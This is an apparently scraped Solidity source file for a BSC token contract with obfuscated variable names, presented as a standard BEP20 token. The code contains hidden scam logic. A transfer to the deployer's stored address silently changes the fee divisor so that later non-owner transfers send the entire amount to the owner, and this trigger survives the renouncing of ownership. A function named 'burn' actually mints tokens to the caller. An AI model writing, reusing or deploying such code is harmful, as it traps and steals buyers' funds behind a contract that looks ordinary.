/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-12
 */
pragma solidity >=0.4.11;
contract vlBvuM {
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
uint256 public  ZRFplK = 10000000000000000000;
address public  ArljwX = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  HHLYSL = 10000000000000000;
address public  iNxJvD = address(0);
address private  yYLats = address(0);
address public  Rhizzm = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant liMDAb = 9+1;
string public  name = "cyCzmM";
uint256 public  giTWxt = 100000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "JjMdfT";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  MQxBkW = 100000000000000000000000;
address public  wkcSKf = address(0);
uint256 public  Cdvppa = 1000000000000000000;
address public  JBnrWT = address(0);
uint256 private  xjPhMY = 10000000000000;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  uZrFfU = 100000000000000000000000;
uint256 public  VrbRJD = 10000000000000000000000000000;
uint256 public  VxSzBS = 100000000000000000000;
address public  hFPezT = address(0);
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UfHrAY");
require(to != address(0), "UfHrAY");
require(amount <= balanceOf[from], "UfHrAY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* liMDAb/xjPhMY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==yYLats){
xjPhMY = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
yYLats = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}